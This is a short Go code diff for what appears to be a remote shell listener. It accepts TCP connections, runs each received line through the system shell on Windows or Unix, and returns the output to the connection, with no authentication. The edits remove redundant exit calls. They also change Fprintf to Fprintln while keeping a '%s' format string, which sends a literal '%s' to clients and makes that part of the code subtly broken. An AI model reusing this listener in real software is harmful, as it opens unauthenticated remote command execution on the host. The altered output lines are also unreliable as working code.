@@ -25,7 +25,6 @@ func listener(comms_data string) {
 
 	if err != nil {
 		log.Fatalln("Unable to start listener, port is in use")
-		os.Exit(1)
 	}
 	defer listen.Close()
 	fmt.Println("Listening on " + comms_data)
@@ -33,7 +32,6 @@ func listener(comms_data string) {
 		conn, err := listen.Accept()
 		if err != nil {
 			log.Fatalln("Unable to accept connection", err.Error())
-			os.Exit(1)
 		}
 		go handleRequest(conn)
 
@@ -46,15 +44,15 @@ func handleRequest(conn net.Conn) {
 		if (config.Platform == "Windows"){
 			out, err := exec.Command(config.Shell, "/C", strings.TrimSuffix(message, "\n")).Output()
 		if err != nil {
-			fmt.Println("unable to run command,", conn, "%s\n", err)
+			fmt.Println("unable to run command,", conn, "%s", err)
 		}
-		fmt.Fprintf(conn, "%s\n", out)
+		fmt.Fprintln(conn, "%s", out)
 		}else {
 			out, err := exec.Command(config.Shell, "-c", strings.TrimSuffix(message, "\n")).Output()
 		if err != nil {
-			fmt.Println("unable to run command,", conn, "%s\n", err)
+			fmt.Println("unable to run command,", conn, "%s", err)
 		}
-		fmt.Fprintf(conn, "%s\n", out)
+		fmt.Fprintln(conn, "%s", out)
 		}
 
 	}
